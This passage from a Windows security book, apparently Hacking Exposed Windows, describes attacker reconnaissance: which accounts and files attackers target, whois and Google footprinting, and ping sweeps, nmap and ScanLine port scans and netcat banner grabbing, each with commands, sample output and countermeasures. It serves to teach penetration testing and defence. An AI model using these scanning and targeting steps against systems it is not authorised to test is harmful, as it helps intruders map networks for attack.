decrypted only by the  user private key Used to recover the  user master key without  dependence on the  user’s password  because this is the only place the operating system’s Cryptographic Service Providers   CSPs  look for private keys. The System Certificates, RSA, and Protect folders have their  system attributes set. This prevents the files in them from being encrypted by EFS, which  would make them inaccessible.  Microsoft Outlook offers its own interface for importing exporting S MIME keys  used to encrypt and  sign e-mail , but it does not allow you to set strong protection on access to the private key. You should  use the Certificates MMC snap-in to import S MIME keys if you want to enable this functionality.  The .NET Framework  One key new change made in Windows Server 2003 is the tight integration of the .NET  Framework. The .NET Framework is a development platform designed to simplify the  creation  of  distributed  applications.  It  has  several  main  components:  the  common  language runtime  CLR , the .NET Framework class library, and the runtime hosts.  The CLR is the foundation of the .NET Framework. It is actually a separate execution  environment from the standard operating system runtime engine. Executables written    Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   49  using the .NET Framework  called assemblies  are compiled to execute in the CLR and not  the operating system runtime engine. The .NET Framework class library is a collection  of class libraries that can be used to develop .NET applications. The .NET Framework  also  provides  several  runtime  hosts,  including  Windows  Forms  and ASP.NET,  which  work directly with the CLR to implement server-side runtime environments. The .NET  Framework is installed by default starting with Windows Server 2003.  Entire books have been written about .NET Framework security, and we’re not going  into a great level of detail here. For more information about the .NET Framework, see the  “References  and  Further  Reading”  section  at  the  end  of  this  chapter.  We  focus  here  primarily on the location of key configuration files for the CLR, which may be targeted  by malicious hackers if they’re given the opportunity.  The .NET Framework files are installed in %systemroot%Microsoft.NET\Framework\   each installed version of .NET has its own separate folder here . Some configuration  files are also stored in the user’s profile directory. Table 2-9 illustrates the configuration  files that control .NET Framework security policy.  These XML files contain configuration data that controls what types of assemblies  may  execute  on  the  system  and  the  security  permissions  to  which  assemblies  must  adhere once they are loaded in the runtime. The set of permissions that an assembly  receives is determined by the intersection of the permission sets defined by each of these  three levels of policy in a hierarchical fashion: enterprise policy supersedes local security .config, which supersedes user security.config.  Settings in these configuration files can be manipulated using the .NET Framework   Configuration tool  mscorcfg.msc .  Machine.conﬁ g, Web.conﬁ g, and Custom .conﬁ g Files Other key .NET Framework configuration files to consider from a security perspective are  Machine.config  stored in the .NET system folder, per-version , which sets global parameters  for assemblies running on the system; Web.config  typically stored in the root folder of a  web application, such as C:\Inetpub\wwwroot\ , which defines application-level security  configuration parameters such as authentication protocols and username  password lists;  and custom .config files that can take any name that resides in application directories.

This  token is used to authorize all subsequent access to resources on the system  by the security subsystem  which comprises both user and kernel mode  components . To date, no one has publicly disclosed a technique for defeating  this architecture, other than running arbitrary commands in kernel mode,  defeating the integrity of the entire system.     Windows uses SIDs to identify accounts internally; the friendly account names are simply conveniences. Remember to use the domain or computer name  prepended to the username when using the net use command to log on to  remote systems  Windows interprets the SID, not the friendly account name .    Members of the Administrators group are the juiciest target on a local Windows   system, because they inherit the highest privileges. All other accounts have  very limited privileges relative to the Administrators. Compromise of an  Administrator is thus almost always the ultimate goal of an attacker.     Domain Admins and Enterprise Admins are the juiciest targets on a Windows   domain because they are all-powerful on the domain or forest. Compromise  of an account that is already a member of one of these groups, or addition  of a compromised account to the local Administrators, Domain Admins, or  Enterprise Admins, is thus almost always the ultimate goal of an attacker.     The Everyone group can be leveraged to gain a foothold on a Windows system  without authenticating. Also, the INTERACTIVE identity is required in many  instances to execute privilege escalation attacks against Windows.     Account information is kept in the SAM  %systemroot%\system32\conﬁ g\  sam  or Active Directory  %systemroot%\ntds\ntds.dit  by default. Passwords  are irreversibly scrambled  hashed  such that the corresponding cleartext cannot  be derived directly, although it can be cracked, as you will see in Chapter 7.     Domain controllers are the most likely targets of malicious attacks, since they   house all of the account information for a given domain. They are also the most  likely systems in a Windows environment to be heavily secured and monitored,  so a common ploy is to attack the more poorly defended systems on a domain  and then leverage this early foothold to gain subsequent complete control of  any domains related to it.     The extent of the damage done through the compromise of a single system is  greatly enhanced when accounts from one domain are authenticated in other  domains via the use of trusts.     The boundary of trust in Windows 2000 and later is the forest, not the domain   as under NT. Forest trusts are possible in Windows Server 2003 and later native  mode.   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   51     Local authentication differs from network authentication, which uses the LM  NTLM protocols by default under Windows. The LM authentication algorithm  has known weaknesses that make it vulnerable to attacks; these are discussed  in Chapter 5. Windows 2000 and later can optionally use the Kerberos network  authentication protocol in homogeneous, intra-forest environments, but currently  no mechanism is available to force the use of Kerberos. Kerberos also has known  attack mechanisms, which are discussed in Chapter 5.     In addition to authentication and authorization, Windows can audit success and   failure of all object access, if such auditing is enabled at the system level and,  speciﬁ cally, on the object to be audited.     Some other major elements of Windows that may be targeted by intruders   include cryptographic keys and the .NET Framework conﬁ guration ﬁ les.

Footprinting and scanning are  the digital equivalent of casing the establishment.  Footprinting might be considered the equivalent of searching the telephone directory  for  numbers  and  addresses  related  to  a  corporate  target,  while  scanning  is  similar  to  driving to the location in question and identifying which buildings are occupied and  what doors and windows may be available for access. Footprinting and scanning are the  identification of ripe targets and available avenues of entry, and they are a critical first  step in the methodology of the Windows attacker. Clearly, attacking the wrong house or  overlooking an unlocked side door can quickly derail an attack or a legitimate penetration  audit of an organization!  Footprinting  is  the  process  of  creating  a  complete  profile  of  the  target’s  information  technology  IT  posture, which typically encompasses the following categories:    Internet Network  Domain Name System  domain names, network address   blocks, and location of critical systems such as name servers, mail exchange  hosts, gateways, and so on    Intranet Essentially the same components as the Internet category, but speciﬁ c  for internal networks with their own separate address namespace, if applicable    Remote Access  Dial-up and virtual private network  VPN  access points   Extranet Partner organizations, subsidiaries, networks, third-party   connectivity, and so on    Miscellaneous Catchall category for any sources of information that don’t ﬁ t  neatly into the other categories, including Usenet, instant messaging, Securities  and Exchange Commission  SEC  databases, employee proﬁ les, and so on  From  a  professional  penetration  tester’s  perspective,  footprinting  is  mostly  about  comprehensively  scoping  the  job.  The  tester  must  probe  the  footprint  of  each  of  the  organization’s IT categories in a methodological and comprehensive fashion to ensure  that no aspect of the organization’s digital posture gets overlooked in the ensuing scanning  and penetration testing. Of course, the malicious hacker’s perspective is probably pretty  much the same: he or she seeks out the forgotten portions of an infrastructure that may be  unguarded, poorly maintained, and or configured insecurely.  This said, examination of many of these components is outside of the scope of this  book, which is focused on Windows. For example, footprinting a target’s remote access  presence is typically done by analyzing phone records and war dialing, which are not  Windows-specific processes. Physical scoping such as war driving around a distributed  corporation’s offices, or assessing point-of-sale systems, are also good examples of types  of non–Windows-oriented research. This is not to say that such analysis is not critical to    Chapter 3:   Footprinting and Scanning   55  estimating  the  overall  posture  of  an  organization,  but  it  typically  requires  cross- disciplinary analytical techniques that are not necessarily Windows-centric.  Such topics are covered in more depth in Chapter 1 of McGraw-Hill’s Hacking Exposed,  Fifth Edition and will not be reiterated here in full detail. Instead, we will focus briefly on  footprinting Windows systems via the Internet, since this is often the source of the most  dangerous information leaks about the online presence of an organization.  whois  Popularity: Simplicity: Impact: Risk Rating:  6 9 1 5  Many tools can be used to footprint an organization’s Internet presence, but the most  comprehensive  and  effective  tool  is  whois,  the  standard  utility  for  querying  Internet  registries.  It  provides  several  kinds  of  information  about  an  organization’s  Internet  presence, including the following:     Internet Registrar data    Organizational information    Domain Name System  DNS  servers    Network address block assignments    Point of contact  POC  information  The data queried via whois is spread across numerous servers around the world for  technical and political reasons. To complicate matters, the WHOIS query syntax, type of  permitted queries, available data, and the formatting of the results can vary widely from  server to server. Furthermore, many of the registrars are actively restricting queries to  combat spammers, hackers, and resource overload  and by the way, information for  .mil and .gov has been pulled from public view entirely due to national security concerns .  Finally,  Internet  domain  names   such  as  winhackingexposed.com   are  registered  separately from numeric addresses  such as IP addresses, net blocks, Border Gateway  Protocol   BGP   autonomous  system  numbers,  and  so  on ,  so  two  separate  whois  methodologies  are  typically  pursued  to  develop  comprehensive  information  about  a  target. Despite these peculiarities, whois remains one of the most effective tools available  for mining Internet presence data, so we’ll discuss a few of the more prominent techniques  for exploiting it here.  A  great  tool  for  performing  many  types  of  Internet  queries  is  Sam  Spade,  which  comes in a Win32 version and a web-based interface that are both available at http:   samspade.org. Sam Spade’s tool is shown in Figure 3-1 performing a domain name query  that reveals administrative contact phone numbers.   56   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 3-1  Sam Spade’s whois query tool reveals point of contact information about a corporate  target.  Much of the information revealed by whois may seem innocuous, but to highlight  the  potential  risks,  we  always  like  to  relate  one  of  our  favorite  consulting  anecdotes,  concerning a mid-sized technology company that published its CIO’s name, direct phone  line, and e-mail address as the point of contact information for the organization at one of  the large Internet registries. This information was thus trivial to obtain using a whois  POC query. Using this information to masquerade as the CIO, we quickly gained remote  access  to  several  valuable  internal  resources  at  the  client  and  had  compromised  the  company’s entire network infrastructure just days later.  Sam Spade is proficient at multiple whois query types and can search many different  whois databases on the Internet  domain name registries, IP address databases, and so  on . It also performs many more tasks than just whois, including ping, traceroute, dig,  DNS zone transfers, SMTP relay checking, website crawling, and much more. It is a truly  handy utility.  As noted earlier, IP address information is stored in a separate set of registries from  domain name data. Although Sam Spade can query IP address registries, we sometimes  find it helpful to visit them directly. The American Registry for Internet Numbers  ARIN   is the official body for making IP address block assignments in the United States, and  offers a web-based whois tool for searching its database at http:  arin.net whois. Of  course,  you  will  need  to  consult  other  registries  such  as  the  Asia-Pacific  Network  Information  Center   APNIC   and  Réseaux  IP  Européens   RIPE   for  non-U.S.  blocks.    Chapter 3:   Footprinting and Scanning   57  Figure 3-2 shows a sample query against the company name “Foundstone” that was run  using ARIN’s web-based whois tool.  Countermeasure to whois Footprinting The original free and open ethos of the Internet left a lot of information accessible to the  public, and today that remains the default case. As the Internet domain name registration  marketplace has matured, options to protect this information better have become more  prevalent.  For  example,  Internet  hosting  companies  such  as  Verio  now  offer  “Private  Registration”  that  hides  critical  domain  name  registration  data   name,  address,  and  phone  number  for  administrative  and  technical  contacts  will  be  changed  to  generic  information related to Verio , thus lessening the chance it will be subject to identity theft  and unwanted spam. Verio charges a yearly fee for this feature, which seems somewhat  backward to us—should they be charging the fee to publish the data or perhaps a fee for  those running the query? But, hey, we’re just happy to see the economics of information  protection getting visibility in some form or another  grin .  ARIN  allows  POC  information  to  be  designated  private,  with  the  exception  that   information for at least one POC must be viewable.  Whether marked private or not, organizations should take sensible steps to limit the  quality of information they make available via whois or similar queries. One golden rule is  that  information  provided  to  Internet  registrars  should  be  sanitized  of  direct  contact  information for specific company personnel or other inappropriate information. Remember  the story about the CIO who had his contact information published in whois data.  Figure 3-2  A query against “Foundstone” run through ARIN’s web-based whois tool footprints the  IP address blocks that deﬁ ne the organization’s Internet presence.   58   Hacking Exposed Windows: Windows Security Secrets & Solutions   Internet Search Engines 6 9 1 5  Popularity: Simplicity: Impact: Risk Rating:  Identifying Windows systems within specific sites or domains on the Internet is quite  easy  using  a  standard  search  engine.  One  of  our  favorites  is  Google,  which  can  cull  occurrences of common NT family file paths and naming conventions across the entire  Internet or just within a site or domain. Figure 3-3 shows an example of a Google search  across the Internet .com domain for the common NT 2000 web root path C:\Inetpub.  Note that this search identified about 15,900 matching results in about 0.84 second.  Looking for juicier items is as easy as thinking them up and pumping them through  Google—consider passwords, topologies, and connection strings. The search could easily  be more narrowly tailored to a specific site or domain, such as www.victim.com or victim  .com,  using  Google’s  Advanced  Search  option.  Some  other  interesting  search  strings  used to identify Windows systems on the Internet via search engines like Google are  shown in Table 3-1. The Internet’s best-known wizard at using Google to find the most   Figure 3-3  Using Google to ﬁ nd Windows systems in the “.com” top-level domain   Chapter 3:   Footprinting and Scanning   59  Search String c:\winnt  c:\inetpub  TSWeb default.htm  Potential Result Turns up servers with pages that reference the  standard NT 2000 system folder Reveals servers with pages that reference the  standard NT 2000 Internet services root folder Identiﬁ es Windows Server 2003 Terminal Services  accessible via browser-embedded ActiveX control  Table 3-1  Sample Search Strings and Results  alarmingly sensitive data is j0hnny, whose Google Hacking Database at http:  johnny  .ihackstuff.com ghdb.php will simply blow you away with the things that can be found  with simple searches.  The main culprit behind this problem is the placement of revealing file paths in the  HTML of a web page. Since search engines like Google simply index the content of sites  on the Internet, they make for a handy index of which sites contain such strings as c:\ winnt  and  the  like.  One  of  the  best  examples  of  this  is  when  the  title  of  a  web  page  contains information about the path of the document.  The title can be found within the       tags.  Microsoft FrontPage sometimes automatically inserts the  full path to a document when generating HTML, so be aware that this behavior may be  giving away more about your systems than you care to allow.  Countermeasure to Search Engine Footprinting To  prevent  your  site  from  showing  up  in  a  simple  Internet  search,  you  need  to  eliminate references to revealing strings in your HTML. If you don’t feel like scouring  your own HTML for these landmines, you can always use a search engine to ferret  them out for you.  Even if you are successful at eliminating inappropriate data from your web content,  be aware that the Internet has a memory. Applications such as Google’s cache and the  Wayback Machine at web.archive.org take snapshots of web content going back as far  as 1996. The only recourse we are aware of in these cases is to approach the application  owners   such  as  Google   and  request  that  the  cache  be  removed  or  purged  of  the  offending data.  For the rest of this chapter, and indeed the entire book, we assume that the crucial  groundwork of footprinting has been laid. This is not meant to diminish the critical role  footprinting plays in the overall methodology of an attack. Clearly, if the foundational  steps of any methodology are not carried out with deliberation and precision, the rest of  the process suffers immensely—especially in security, where one overlooked server or  modem line can be your undoing!   60   Hacking Exposed Windows: Windows Security Secrets & Solutions   SCANNING  Assuming that a proper footprint has been obtained, the next step is to identify what  systems are “alive” within the network ranges and what services they offer. To return  briefly to our analogy of casing the establishment, scanning is akin to identifying the  location of the establishment and cataloging its doors and windows. Scanning comprises  three main components:     Ping sweeps    Port scans    Banner grabbing  We’ll talk about each of these techniques in this section.  Again, we’ll be Windows-centric here, but clearly scanning is applicable to all technologies, Microsoft- manufactured or not. See the latest edition of Hacking Exposed for more details.  Ping Sweeps  Popularity: Simplicity: Impact: Risk Rating:  5 5 1 4  The Internet Control Message Protocol  ICMP  Echo Request, more commonly known  as ping  after  the  utility  that  performs  such  requests,  has  traditionally  been  used  to  determine whether a TCP IP host is alive. Anyone reading this book has likely used  ping at one time or another, but here is a quick illustration of the built-in Windows ping  utility for those few who have led sheltered lives to this point: C:\>ping www.victim.tst Pinging www.victim.tst [192.168.2.5] with 32 bytes of data:  Reply from 192.168.2.5: bytes=32 time=38ms TTL=47 Reply from 192.168.2.5: bytes=32 time=36ms TTL=47 Reply from 192.168.2.5: bytes=32 time=35ms TTL=47 Reply from 192.168.2.5: bytes=32 time=40ms TTL=47  Ping statistics for 192.168.2.5:     Packets: Sent = 4, Received = 4, Lost = 0  0% loss , Approximate round trip times in milli-seconds:     Minimum = 35ms, Maximum = 40ms, Average = 37ms   Chapter 3:   Footprinting and Scanning   61  A live host will respond with an ICMP Echo Reply, or ping, of its own, and if no other  restricting factors arise between the pinger and pingee, this response is generated. If the  remote host does not exist or is temporarily unreachable, ping will fail and various error  messages will arise.  Ping is a truly efficient way to identify live hosts, especially when it’s used to perform  “ping sweeps,” which, as the name implies, sweep entire networks using ping to identify  all  of  the  live  hosts  therein.  Unfortunately,  almost  every  Internet-connected  network  blocks ping nowadays, so a failure to receive a ping reply from a system usually means  that an intervening firewall or router is blocking ICMP, and it may have no bearing on  whether the host actually exists or not.  Thus, although ping sweeps remain useful for quick and dirty “echo-location” on  internal  networks,  they  really  aren’t  too  effective  when  used  for  security  analysis. A  better way to identify live hosts is to determine whether they are running any services,  which is achieved via port scanning. Most port scanning tools incorporate simultaneous  ping sweep functionality anyway, so let’s talk about port scanners.  Port Scans Popularity: Simplicity: Impact: Risk Rating:  9 5 2 5  Port scanning is the act of connecting to each potential listening service, or port, on a   system and seeing if it responds.  The building block of a standard TCP port scan is the three-way handshake, which is  detailed in Figure 3-4. In this diagram, a typical client is connecting to the World Wide  Web service running on TCP port 80. The client allocates an arbitrary source port for the  socket on a port greater than 1024 and performs a three-way handshake with the WWW  service listening on the server’s port 80. Once the final ACK reaches the server, a valid  TCP  session  is  in  place  between  the  two  systems. Application-layer  data  can  now  be  exchanged over the network.  This  oversimplified  example  illustrates  a  single  TCP  connection.  Port  scanning  performs a series of these connections to arbitrary ports and attempts to negotiate the  three-way handshake. For example, an attacker might scan ports 1–100 on a system to try  to identify whether any common services such as mail  TCP 25  and Web  TCP 80  are  available on that host.  Port Scanning Variations  Several variations on the standard TCP connect scan are designed  to improve accuracy, speed, and stealth. For a good discussion of port scanning in all its  forms, see www.insecure.org nmap. The most practical variations follow:    Source port scanning  By specifying a source port on which to originate   the TCP connection, rather than accepting whatever port is allocated by the  operating system above 1024, an attacker can potentially evade router or  ﬁ rewall access controls designed to ﬁ lter on source port.   62   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 3-4  The TCP three-way handshake, building block of the classic TCP port scan    SYN scanning  By foregoing the last SYN packet in the three-way handshake,  one-third of the overhead of a TCP “connect” scan can be avoided, thus increasing  speed when scanning lots of systems. The SYN ACK is used to gauge the status  of the port in question.    UDP scanning  An obvious variation used to identify non-TCP services such  as Simple Network Management Protocol  SNMP . Typically, User Datagram  Protocol  UDP  scanning sends a UDP packet to the port in question, and if  a “ICMP port unreachable” message is received, it then ﬂ ags the service as  unavailable. If no response is received, the service is ﬂ agged as listening. This  can result in false positives in the case of network congestion or if access control  blocks UDP; thus, UDP scanning is inherently unreliable.  The best port scanning tools perform all these types of scans and more. Let’s look at   some of the most flexible port scanners.  Port Scanning Tools  One of our favorite scanners is SuperScan, written by Robin Keir of  Foundstone. SuperScan is a fast, flexible, graphical network scanning utility that comes  at a great price—free! It also allows flexible specification of target IPs and port lists. The  “Read  ports  from  file”  feature  is  especially  convenient  for  busy  security  consultants.  SuperScan  also  sports  numerous  other  features,  including  banner  grabbing,  SYN  scanning, adjustable scan speed, footprinting capabilities such as whois, HTML reporting,  and even Windows enumeration functionality  see Chapter 4 for more about enumer- ation . We do recommend configuring TCP connect scans rather than SYN scanning on the  “Host And Service Discovery” tab for more consistent results. Figure 3-5 shows SuperScan  at work scanning a default Windows Longhorn Server Build 1715 domain controller.  We  love  graphical  interfaces  as  much  as  the  next  person,  but  for  industrial-scale  work, it’s hard to beat command-line scanners for their speed and flexibility. One of the  most popular scanners of all time is nmap, which we’ve used since its earliest versions.  Nmap has the most comprehensive set of features of any port scanner available today,  including  IP  scanning,  OS  fingerprinting   discussed  later  in  this  chapter ,  firewall  intrusion detection systems evasion, and output to multiple XML-compatible formats.  The  Windows  version  now  comes  with  a  self-installer  that  automates  installation  of    Chapter 3:   Footprinting and Scanning   63  Figure 3-5  SuperScan at work scanning a Longhorn Server domain controller  dependencies   such  as  Winpcap   and  configuration  of  performance  tweaks.  The  only  drawback to nmap is that the sheer volume of features makes it a bit challenging to learn  to  use  effectively  without  substantial  practice   and or  a  good  tutor .  The  following  illustrates  a  simple  full  port  scan  of  a  default  Longhorn  Server  Build  1715  domain  controller using nmap: C:\>nmap -p1-65535 192.168.234.220 Starting Nmap 4.20   http:  insecure.org   at 2007-03-11 21:03 Pacific Daylight Time Interesting ports on 192.168.234.220: Not shown: 65519 filtered ports PORT      STATE SERVICE 53 tcp    open  domain 88 tcp    open  kerberos-sec   64   Hacking Exposed Windows: Windows Security Secrets & Solutions   135 tcp   open  msrpc 139 tcp   open  netbios-ssn 389 tcp   open  ldap 445 tcp   open  microsoft-ds 464 tcp   open  kpasswd5 593 tcp   open  http-rpc-epmap 636 tcp   open  ldapssl 3268 tcp  open  globalcatLDAP 3269 tcp  open  globalcatLDAPssl 5722 tcp  open  unknown 49154 tcp open  unknown 49158 tcp open  unknown 49159 tcp open  unknown 49166 tcp open  unknown MAC Address: 00:0C:29:28:6C:33  VMware  Nmap finished: 1 IP address  1 host up  scanned in 305.750 seconds  Another good command-line scanner is ScanLine  formerly fscan . Although it lacks  the sheer volume of features that nmap has, it covers the fundamentals quite elegantly:     Takes text ﬁ le input for both hosts and ports    Scans both TCP and UDP interchangeably  if using text ﬁ le input for ports,   preﬁ x UDP ports with a -u on the line—for example, -u130-140—or just use the  internal list of UDP ports with the –U switch      Grabs banners while scanning  banner grabbing is discussed in its own section   a little later      Can perform source port scanning using the -g switch    Has stealthy features: ping is optional  -p , port order may be randomized   -z , -d switch can “drip” ports at a user-deﬁ ned rate so as to avoid notice  by intrusion detection systems  IDSs     -c switch can be used to change connection timeout value to wait for responses  from TCP or UDP ports, allowing users to choose whether they want faster  lower  number  or more accurate  higher number  scans     With judicious use of the –c switch, accurate LAN scans can reach more than   100 ports per second  The  following  ScanLine  syntax  illustrates  a  simple  scan  for  services  often  found  running on Windows systems. It is not meant to be an exhaustive scan, but it is a pretty  fast and accurate way of determining whether Windows systems are on the wire. C:\>sl -bpz -c 300 -t 1-445,3389 -u 88,135-137,161,500 10.0.0.1-99  The -bpz  switch  tells  ScanLine  to  grab  banners   b ,  not  to  ping  each  host  before  scanning  p , and to randomize the port order  z . The -c switch sets a wait time of 300  milliseconds for a response from a port, enabling speedier scans  the default is 4000 . The  -t and -u switches delineate TCP and UDP ports to be scanned, respectively. Finally, the  last command argument specifies the IP address range to be scanned—you can specify a  range of IP addresses, a comma-delimited list, or a mixture of both, just like the ports are  defined. Here’s what the output of such a scan might look like:   Chapter 3:   Footprinting and Scanning   65  10.0.0.1 Responds with ICMP unreachable: Yes TCP ports: 53 80 88 135 139 389 445 3389 UDP ports: 88 137 500  TCP 80: [HTTP 1.1 200 OK Content-Length: 1433 Content-Type: text html Content-Location: http:  192.168.234.244 iisstart.htm Last-Modified: Sat, 22 Feb 2003 01:48:30 G]  TCP 389: [0 a]  Note that each active port is listed, and banners have been obtained for some ports  for  example, this system appears to be running a web server on port 80 . This particular scan  averaged about 80 ports per second over a LAN connection.  Table 3-2 lists several TCP and UDP services commonly found listening on Windows  products. Although some of these ports are common to many Internet-oriented operating  systems  for example, TCP 80 HTTP , those in boldface type are specific to Windows  products  for example, TCP 445 SMB over TCP . You can use these ports as arguments  to your own ScanLine or nmap routine, or parse the output of either tool looking for  these ports if you are interested in finding Windows systems and services.  Here are some things to note about Table 3-2:     NT family systems listen on TCP 139 by default, but Windows 9x does not listen   on TCP UDP 135.     Another differentiator is TCP UDP 445, which is available by default on   Windows 2000 and beyond, but not NT 4 or Windows 9x.  This little bit of trivia should allow you to distinguish between members of the Windows  family if these ports all show up in port scan results.  A final point to make about Table 3-2: Since Windows XP Service Pack 2, Microsoft  has implemented the Windows Firewall to block all of these ports by default, so you  won’t see them in port scan results. One interesting exception to this is Windows servers  that have been promoted to domain controllers that will list a number of these services  as available. Recall our testing of a default Longhorn Server Build 1715 domain controller  using  nmap  earlier  in  this  chapter. As  you  can  see  from  these  and  other  scanner  test  results in this section, a number of services are listening by default on Longhorn domain  controllers  at least in this prerelease build , and ping was also permitted. We validated  these results by running netstat on the target host, and every one except FTP was in fact  listening   we’re  not  sure  why  FTP  showed  up  in  this  particular  test .  The  Windows  Firewall was activated and in its default configuration. Most of these services are related  to Windows domain functionality, so this result is not unexpected. But it is still sobering  to  see  this  many  potentially  exploitable  services  accessible  by  default  on  domain  controllers  that  are  supposed  to  be  the  guardians  of  the  Windows  domain  infrastructure.   66   Hacking Exposed Windows: Windows Security Secrets & Solutions   Protocol TCP TCP TCP UDP TCP TCP UDP UDP TCP UDP UDP TCP  UDP TCP UDP TCP TCP UDP TCP UDP UDP TCP TCP TCP UDP TCP TCP TCP TCP UDP TCP  Port No. 21 25 53 80 88 123 135 137 138 139  161 389 443 445 464 500 593 636 1433 1434 3268 3269 3389 4500  Randomly  selected 4- digit port   Service FTP SMTP DNS WWW Kerberos Network Time MSRPC Endpoint Mapper NetBIOS Name Service NetBIOS Datagram Service NetBIOS Session Service  SMB CIFS over  NetBIOS  SNMP LDAP HTTP over SSL TLS Direct Host  SMB CIFS over TCP  Kerberos kpasswd Inet Key Exch, IKE  IPSec  HTTP RPC Endpoint Mapper  LDAP over SSL TLS MSSQL MSSQL Instance Mapper AD Global Catalog AD Global Cat over SSL Windows Terminal Server Microsoft IPsec NAT Traversal IIS HTML Mgmt  W2K   Table 3-2  Common Windows TCP UDP Services   Chapter 3:   Footprinting and Scanning   67  Countermeasures for Ping Sweeps and Port Scanning Ping sweeps and port scans are best blocked at the network level using router and or  firewall access control configurations that block all inbound and outbound access that is  not specifically required. Be especially sure that ICMP Echo Requests and the Windows- specific ports TCP UDP 135–139 and 445 are never available from the Internet.  Echo Request is only one of 17 types of ICMP packet. If some ICMP access is necessary, carefully  consider  which  types  of  ICMP  traffic  to  pass.  A  minimalist  approach  may  be  to  allow  only  ICMP  ECHO-REPLY, HOST UNREACHABLE, and TIME EXCEEDED packets into the DMZ network.  For stand-alone hosts, disable unnecessary services so that they do not register in  port scans. Chapter 4 discusses strategies for disabling the Windows-specific services  TCP UDP 135–139 and 445 on Windows.  It’s also a good idea to configure the Windows Firewall  or host-based IPSec filters in  older Windows versions lacking the firewall  to block all services except those explicitly  required, even if you have disabled them or have them blocked at the firewall. Defense- in-depth  makes  for  more  robust  security  and  prevents  a  security  lapse  if  someone  inadvertently enables an unauthorized service on the system.  Be sure to set the NoDefaultExempt Registry key when using IPSec filters to disable the exemption  for Kerberos and Resource Reservation Setup Protocol  RSVP  traffic.  Security administrators and consultants who perform authorized network scanning  should recognize that IDSs are capable of detecting ping sweeps and port scans. Although  the volume of such activity on the Internet is so great that it is probably a waste of time  to  track  such  events  religiously,  your  organizational  policy  may  vary  on  how  much  monitoring of scans should be performed.  Banner Grabbing  Popularity: Simplicity: Impact: Risk Rating:  9 5 2 5  As  you  have  already  seen  in  our  previous  demonstrations  of  port  scanning  tools,  service banner information can be read while connecting to services during a port scan.  Banner information may reveal the type of software in use  for example, if the web server  is  IIS   and  possibly  the  operating  system  as  well. Although  it  is  not  overwhelmingly  sensitive, this information can add greater efficiency to an attack since it narrows the  attacker’s focus to the specific software in question.   68   Hacking Exposed Windows: Windows Security Secrets & Solutions   Banner grabbing can also be performed against individual ports using a simple tool  like telnet or netcat. Here is an example of banner grabbing using netcat and the HTTP  HEAD method  CRLF indicates a carriage return line feed : C:\>nc -vv server 80 server [192.168.234.244] 80  http  open HEAD   HTTP 1.0 [CRLF][CRLF] HTTP 1.1 200 OK Content-Length: 1433 Content-Type: text html Content-Location: http:  192.168.234.244 iisstart.htm Last-Modified: Sat, 22 Feb 2007 01:48:30 GMT Accept-Ranges: bytes ETag: “"06be97f14dac21:2da"" Server: Microsoft-IIS 6.0 Date: Sat, 24 May 2007 22:14:15 GMT Connection: close  sent 19, rcvd 300: NOTSOCK  Instead  of  remembering  potentially  complex  syntax  for  each  service,  you  can  just  write it to a text file and redirect it to a netcat socket. For example, take the HEAD     HTTP 1.0 [CRLF][CRLF] command and write it to a file called head.txt. Then simply  redirect head.txt through an open netcat socket like so: C:\>nc -vv victim.com 80 < head.txt  The result is exactly the same as typing in the commands once the connection is open.  Countermeasures for Banner Grabbing If  possible,  change  the  banner  presented  by  services  that  must  be  accessed  from  the  network. For example, the free Microsoft ISAPI filter called URLScan can change the IIS  HTTP  header  using  the AlternateServerName=  setting.  By  default,  this  setting  is  blank; you will also have to make sure that the RemoveServerHeader setting is set to  0.  For  example,  you  can  set  AlternateServerName  to  Apache 2.0.26   Linux   or  Apache 1.3.20  UNIX  to throw off would-be attackers.  Some might debate the wisdom of making configuration changes that could reduce  performance or stability simply to hide the fact that a server is running a known software  package  a fact that can usually be gleaned readily by looking at the type of information  it is serving up—for example, Active Server Pages pretty much indicates that the server  is IIS . However, hordes of hackers and script kiddies frequently scan the Internet using  automated tools to seek out and identify specific software versions to try out the latest  hack du jour. These scripts often trigger on the server banner. If your server’s banners are  different, you may fall below their radar.   Chapter 3:   Footprinting and Scanning   69  You should also strongly consider placing a warning in custom-tailored service banners.  This  warning  should  explicitly  state  that  unauthorized  users  of  the  system  will  be  prosecuted, and any usage indicates consent to be monitored and have activities logged. OS Detection via TCP IP Stack Fingerprinting If a TCP service is found to be available via port scanning, the operating system of a target  machine may also be detected by simply sending a series of TCP packets to the listening  service and seeing what replies come back. Because of subtle differences in the TCP IP  implementations  across  various  operating  systems,  this  simple  technique  can  fairly  reliably identify the remote OS. Unfortunately, some variations on this technique use non- RFC-compliant packets that may cause unexpected results on the target system  up to and  including system crashes , but most recent approaches are quite safe. So-called “passive”  stack fingerprinting can also be performed using network eavesdropping, or sniffing, to  examine network communications passing to and from a host. An in-depth discussion of  TCP IP stack fingerprinting is outside the scope of this book, but we have included some  links to more information in the “References and Further Reading” section. Nmap can perform TCP IP stack fingerprinting if you specify the –A option, which  enables  OS  detection.  The  next  example  shows  nmap’s  OS  detection  feature  at  work  against a default Longhorn Server Build 1715 domain controller  some output has been  removed for clarity . Nmap makes a pretty good guess of the operating system!

Because of the “fire-and-forget” ease of tools like ScanLine, the critical importance of  footprinting and scanning can be overlooked when auditing your own systems using the    70   Hacking Exposed Windows: Windows Security Secrets & Solutions   methodology discussed in this book. Don’t make this mistake—the entire methodology is  built on the information obtained in the first two steps, and a weak effort here will undermine  the entire process. After all, a single missed system or service may be your undoing.  This said, don’t go overboard for accuracy. Networks are by nature dynamic entities  and will likely change mere hours after your first port scan. It is therefore important that  you perform footprinting and scanning on a regular basis and monitor changes carefully.  If  the  burden  of  maintaining  a  rigorous  assessment  schedule  is  too  much  for  your  organization, consider an automated vulnerability management tool and or managed  service. It handles all of the details so that you don’t have to.  Speaking of such tools and services, it’s important to point out that the intent of this  chapter  is  simply  to  provide  an  introduction  to  the  basic  concepts  involved  in  network  security auditing. Although we’ve illustrated a lot of tools and techniques using manual  methods in this chapter, most security practitioners today employ specialized vulnerability  scanners  that  automate  all  of  the  functionality  we’ve  demonstrated.  Furthermore,  these  new tools will go well beyond simple host and service identification and perform automated  vulnerability validation. Modern tools are also capable of scanning the application layer for  what were once considered to be difficult-to-validate custom logic vulnerabilities. As the  technology market has matured, evolving industry and government regulations like the  Payment  Card  Industry  Data  Security  Standard   PCI  DSS   have  also  driven  increasing  standardization, to the point where security scanning is now considered a commodity item  that is priced at a few dollars per scanned host. If you are doing security 